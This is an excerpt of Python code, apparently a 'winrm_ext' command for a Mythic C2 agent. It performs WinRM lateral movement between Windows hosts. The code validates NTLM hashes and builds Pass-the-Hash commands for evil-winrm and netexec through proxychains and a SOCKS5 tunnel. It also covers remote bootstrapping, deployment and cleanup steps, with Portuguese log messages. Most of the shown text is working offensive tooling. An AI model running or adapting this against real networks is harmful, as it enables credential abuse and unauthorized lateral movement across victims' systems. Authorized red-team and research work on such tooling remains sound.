    def winrm_ext(self, task_id, target="", port=5985, username="", password="",
        ...
        #  nthash    : NTLM hash (Pass-the-Hash) para comandos de acesso evil-winrm/nxc -H
        ...
        port = int(port)
        nthash = (nthash or "").strip().replace(" ", "")
        if nthash and ":" in nthash:
            # LM:NT → usa só NT (últimos 32)
            parts_h = nthash.split(":")
            nthash = parts_h[-1] if len(parts_h[-1]) == 32 else nthash.replace(":", "")
        if nthash and len(nthash) != 32:
            return "[!] nthash inválido: informe 32 hex (NT) ou LM:NT (ex: aad3...:31d6...)"

        # ── MODO REMOTO (A → B) ────────────────────────────────────────────────
        if remote:
            return self._winrm_ext_remote(task_id, remote, port, username, password,
                                          domain, socks_port, add_user, add_pass, ssl,
                                          action, deploy, nthash)
        ...
        if username and (password or nthash):
            out.append("")
            if nthash:
                out.append("-- Pass-the-Hash (nthash) — evil-winrm / netexec ----------")
                out.append("  proxychains evil-winrm%s -i %s -u '%s' -H '%s' -P %d"
                           % (ssl_flag, ip, display_user, nthash, port))
                out.append("")
                nxc = "nxc winrm %s -u %s -H %s" % (ip, username, nthash)
                if domain:
                    nxc += " -d %s" % domain
        ...
        if nthash:
            out.append(" [*] Auth    : Pass-the-Hash (nthash)")
        elif password:
    ...
    def _winrm_ext_remote(self, task_id, host, port=5985, username="", password="",
                          ...
                          ssl=False, action="", deploy="", nthash=""):
        ...
        if not username:
            return "[!] winrm_ext (remote): username obrigatório"
        nthash = (nthash or "").strip().replace(" ", "")
        if nthash and ":" in nthash:
            parts_h = nthash.split(":")
            nthash = parts_h[-1] if len(parts_h[-1]) == 32 else nthash.replace(":", "")
        if nthash and len(nthash) != 32:
            return "[!] nthash inválido: informe 32 hex (NT) ou LM:NT"
        if not password and not nthash:
            return ("[!] winrm_ext (remote): informe password e/ou nthash. "
                    "Bootstrap (WinRM fechado) exige password; acesso PtH usa nthash.")
        ...
        auth_lbl = "PtH(nthash)" if nthash and not password else (
            "password+PtH" if (password and nthash) else "password")
        log("[*] Porta alvo: %d | Credencial: %s | Auth: %s" % (port, dom_user, auth_lbl))
        ...
        ps_ok = False
        sb_guid = ""
        pth_only = bool(nthash) and not password

        # ================== 2) BOOTSTRAP ==================
        # PtH-only: se WinRM já escuta, não reconfigura (bootstrap nativo exige password)
        if pth_only and w_open:
            log("[*] Modo PtH-only: WinRM já aberto em %s:%d — skip bootstrap, só acesso -H" % (host, port))
            ps_ok = True
        elif pth_only and not w_open:
            log("[!] Modo PtH-only mas WinRM fechado em %s:%d" % (host, port))
            log("[!] Bootstrap A→B com hash puro (WMI/SMB PtH) não implementado neste build.")
            log("[!] Forneça password para bootstrap, ou habilite WinRM no alvo antes.")
            return "\n".join(out)

        if w_open and not pth_only:
        ...
        if not ps_ok and not pth_only and (w135 or w445):
        ...
        if not ps_ok and not pth_only and w445:
        ...
        if username and nthash:
            log("")
            log("  -- Pass-the-Hash (nthash) --")
            log("  proxychains evil-winrm%s -i %s -u '%s' -H '%s' -P %d"
                % (ssl_flag, host, display_user, nthash, port))
            nxc = "nxc winrm %s -u %s -H %s" % (host, username, nthash)
            if domain:
                nxc += " -d %s" % domain
            nxc += " -P %d --proxy socks5://127.0.0.1:%d" % (port, socks_port)
            if ssl:
        ...
        if password:
            ...
            log("")
            log("=" * 70)
            log(" MOVIMENTAÇÃO A PARTIR DO HOST-A")
            log("=" * 70)
            log("  [*] Apenas nthash: use evil-winrm/nxc -H via SOCKS5 do Mythic (acima).")
            log("  [*] Jump PSRemoting nativo no agente exige password (PSCredential).")
        ...
        if deploy:
            ...
            if nthash:
                log("    winrm_ext {\"target\":\"%s\",\"username\":\"%s\",\"nthash\":\"%s\"%s}"
                    % (host, username, nthash, (",\"domain\":\"%s\"" % domain) if domain else ""))
        ...
        if nthash:
            log(" [*] Auth    : Pass-the-Hash (nthash)")
        elif password:
            log(" [*] Auth    : password")
        # cleanup ainda precisa password para PSRemoting/WMI/schtasks
        if password:
            log(" [*] Limpeza : winrm_ext {\"remote\":\"%s\",\"action\":\"cleanup\","
                "\"username\":\"%s\",\"password\":\"%s\"%s}"
                % (host, username, password, (",\"domain\":\"%s\"" % domain) if domain else ""))
        else:
            log(" [*] Limpeza : requer password (bootstrap reverso); ou cleanup manual no alvo")
        log("=" * 70)
